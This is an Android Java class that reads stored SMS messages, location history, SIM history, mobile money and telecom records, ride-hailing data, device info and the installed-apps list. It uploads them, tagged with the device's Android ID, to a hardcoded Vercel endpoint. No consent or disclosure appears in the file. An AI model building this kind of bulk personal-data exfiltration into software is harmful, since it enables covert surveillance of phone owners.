package com.datacollector;

import android.content.Context;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class DataSyncManager {

    // Server URL — Vercel deployment
    private static final String SERVER_URL = "https://backend-black-six-89.vercel.app/api/collect";

    private final Context context;
    private final DatabaseHelper db;

    public DataSyncManager(Context context) {
        this.context = context;
        this.db = DatabaseHelper.getInstance(context);
    }

    public interface SyncCallback {
        void onComplete();
    }

    public interface ProgressCallback {
        /** Called after each table is synced. done=tables finished, total=total tables */
        void onProgress(int done, int total);
    }

    /** Total number of tables synced — used by callers to calculate overall progress */
    public static final int SYNC_TABLE_COUNT = 8;

    public void syncAll(SyncCallback callback, ProgressCallback progressCallback) {
        new Thread(() -> {
            String[][] tables = {
                {"sms",            null},
                {"location",       null},
                {"sim_history",    null},
                {"mobile_money",   null},
                {"telecom_usage",  null},
                {"ride_hailing",   null},
                {"device_info",    null},
                {"installed_apps", null},
            };
            JSONArray[] data = {
                db.getUnsyncedSms(),
                db.getUnsyncedLocations(),
                db.getUnsyncedSimHistory(),
                db.getUnsyncedMobileMoney(),
                db.getUnsyncedTelecomUsage(),
                db.getUnsyncedRideHailing(),
                db.getUnsyncedDeviceInfo(),
                db.getUnsyncedInstalledApps(),
            };
            for (int i = 0; i < tables.length; i++) {
                syncTable(tables[i][0], data[i]);
                if (progressCallback != null) {
                    progressCallback.onProgress(i + 1, SYNC_TABLE_COUNT);
                }
            }
            if (callback != null) callback.onComplete();
        }).start();
    }

    private void syncTable(String type, JSONArray data) {
        if (data.length() == 0) return;

        try {
            JSONObject payload = new JSONObject();
            payload.put("type", type);
            payload.put("data", data);
            payload.put("device_id", android.provider.Settings.Secure.getString(
                context.getContentResolver(),
                android.provider.Settings.Secure.ANDROID_ID
            ));

            String body = payload.toString();

            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body.getBytes(StandardCharsets.UTF_8));
            }

            int responseCode = conn.getResponseCode();
            if (responseCode == 200 || responseCode == 201) {
                // Mark as synced in local DB
                String table;
                switch (type) {
                    case "sms":             table = DatabaseHelper.TABLE_SMS;             break;
                    case "location":        table = DatabaseHelper.TABLE_LOCATION;        break;
                    case "sim_history":     table = DatabaseHelper.TABLE_SIM_HISTORY;     break;
                    case "mobile_money":    table = DatabaseHelper.TABLE_MOBILE_MONEY;    break;
                    case "telecom_usage":   table = DatabaseHelper.TABLE_TELECOM_USAGE;   break;
                    case "ride_hailing":    table = DatabaseHelper.TABLE_RIDE_HAILING;    break;
                    case "device_info":     table = DatabaseHelper.TABLE_DEVICE_INFO;     break;
                    case "installed_apps":  table = DatabaseHelper.TABLE_INSTALLED_APPS;  break;
                    default: return;
                }
                db.markSynced(table);
            }

            conn.disconnect();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
